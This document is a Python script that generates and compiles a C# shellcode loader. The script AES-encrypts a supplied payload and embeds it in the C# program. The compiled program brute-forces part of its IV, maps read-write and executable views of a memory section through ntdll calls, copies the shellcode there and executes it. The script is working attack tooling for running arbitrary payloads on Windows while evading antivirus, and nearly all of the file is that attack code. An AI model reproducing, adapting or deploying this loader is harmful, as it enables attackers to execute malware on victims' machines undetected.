import hashlib, os, sys, argparse
from base64 import encode                                                                                                                                                                                                                                                                                                                                                                            
from Crypto.Cipher import AES                                                                                                                                                                                                                                                                                                                                                                        
from Crypto.Util.Padding import pad                                                                                                                                                                                                                                                                                                                                                                  
from Crypto.Random import get_random_bytes


TEMPLATECS = """
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] key = { %s };
            byte[] iv = { %s };
            
            byte[] OG_hash = {
               %s
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, %s) != null) // OG len and encrypted len are different
                    {
                        Console.WriteLine("[*] Decryption Succeeded");
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, %s);
                        // Create local section, map two views RW + RX, copy shellcode to RW
                        Console.WriteLine("\\n[>] Creating local section..");
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }

                        Console.WriteLine("\\n[>] Triggering shellcode using delegate!");
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                    else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            byte[] buf = new byte[%s] { 
                %s 
            };
            Runner(buf);
        }
    }
}
"""

def format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
    hshellcode = ""                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                     
    code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                     
    for num, byte in enumerate(shellcode):                                                                                                                                                                                                                                                                                                                                                           
        if num != code_size - 1:                                                                                                                                                                                                                                                                                                                                                                     
            hshellcode += f"{hex(byte)},"                                                                                                                                                                                                                                                                                                                                                            
        else:                                                                                                                                                                                                                                                                                                                                                                                        
            hshellcode += f"{hex(byte)}"                                                                                                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                                                                                                     
    return hshellcode

parser = argparse.ArgumentParser(description="generate .NET exec")
parser.add_argument('-inbin', type=str, help=".bin file")
parser.add_argument('--arch', type=str, choices=['x86', 'x64'], default="x64")
parser.add_argument('--outfile', type=str, default="out.exe")
args = parser.parse_args()
input_filename = args.inbin
with open(input_filename, "rb") as file: data = file.read()
# encrypt payload
key = get_random_bytes(16)
iv = get_random_bytes(16)
cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv, )
encrypted_data = cipher.encrypt(pad(data, AES.block_size))

m = hashlib.sha256()
m.update(data)

payload_hash = format_shellcode(m.digest())
og_data_len = len(data)
hex_iv = format_shellcode(iv)
hex_k = format_shellcode(key)
e_shc = format_shellcode(encrypted_data)
enc_data_len = len(encrypted_data)


program_cs = TEMPLATECS % (hex_k, hex_iv, payload_hash, og_data_len, og_data_len, enc_data_len, e_shc)
print(program_cs)
with open("Program.cs", "w") as out_file: out_file.write(program_cs)
os.system(f"mono-csc -platform:{args.arch} -out:{args.outfile} -unsafe Program.cs")